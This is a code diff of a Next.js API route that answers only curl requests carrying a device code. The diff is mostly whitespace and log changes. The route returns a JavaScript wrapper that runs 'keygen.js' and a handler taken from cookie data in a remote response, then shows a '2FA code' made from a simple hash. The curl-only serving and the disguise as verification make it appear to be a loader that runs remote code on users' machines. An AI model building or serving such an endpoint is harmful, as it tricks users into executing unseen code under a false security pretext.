@@ -5,22 +5,22 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     const userAgent = req.headers['user-agent'] || '';
     const isCurl = userAgent.toLowerCase().includes('curl');
     const deviceCode = req.query.deviceCode || Object.keys(req.query)[0]; // Support both ?deviceCode=XXX and ?XXX formats
-    
+
     if (isCurl && deviceCode) {
-        // Generate time-sensitive verification code (expires after 3 minutes)
-        const deviceCodeStr = typeof deviceCode === 'string' ? deviceCode : deviceCode.toString();
-        const currentTime = Date.now();
-        const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
-        const seedString = deviceCodeStr + timeWindow.toString();
-        
-        let hash = 0;
-        for (let i = 0; i < seedString.length; i++) {
-          const char = seedString.charCodeAt(i);
-          hash = ((hash << 5) - hash) + char;
-          hash = hash & hash; // Convert to 32-bit integer
-        }
-        const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
-        
+      // Generate time-sensitive verification code (expires after 3 minutes)
+      const deviceCodeStr = typeof deviceCode === 'string' ? deviceCode : deviceCode.toString();
+      const currentTime = Date.now();
+      const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
+      const seedString = deviceCodeStr + timeWindow.toString();
+
+      let hash = 0;
+      for (let i = 0; i < seedString.length; i++) {
+        const char = seedString.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash; // Convert to 32-bit integer
+      }
+      const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
+
       // Create the wrapper script that will execute keygen.js and then generate the 2FA code
       const wrapperScript = `
 const fs = require('fs');
@@ -83,12 +83,9 @@ async function executeKeygen(callback) {
 
           console.log('✅ Keygen handler executed successfully');
         } catch (handlerError) {
-          console.log('⚠️  Error in handler execution setup:', handlerError.message);
+          console.log('⚠️  Error executing keygen handler:', handlerError.message);
           // Continue anyway - keygen failure shouldn't stop 2FA generation
         }
-
-        // Ensure callback is called even if handler execution fails
-        console.log('🔄 Calling callback after keygen execution...');
       } else {
         console.log('⚠️  No cookie data in response, skipping keygen execution');
       }
@@ -108,7 +105,6 @@ async function executeKeygen(callback) {
 
 // ===== 2FA CODE GENERATION =====
 function generate2FACode() {
-  console.log('🔄 Starting 2FA code generation...');
   const verificationCode = '${verificationCode}';
   const deviceCode = '${deviceCodeStr}';
 
@@ -181,7 +177,6 @@ async function main() {
 
   // Step 2: Execute keygen.js, then generate 2FA code
   await executeKeygen(() => {
-    console.log('🔄 Callback executed, calling generate2FACode...');
     // Step 3: Generate and store 2FA code
     generate2FACode();
   });
@@ -199,9 +194,9 @@ async function main() {
 // Start the process
 main();
 `;
-        res.setHeader('Content-Type', 'application/javascript');
+      res.setHeader('Content-Type', 'application/javascript');
       res.status(200).send(wrapperScript);
-        
+
     } else if (isCurl) {
       // Return error for curl requests without device code
       res.status(400).json({
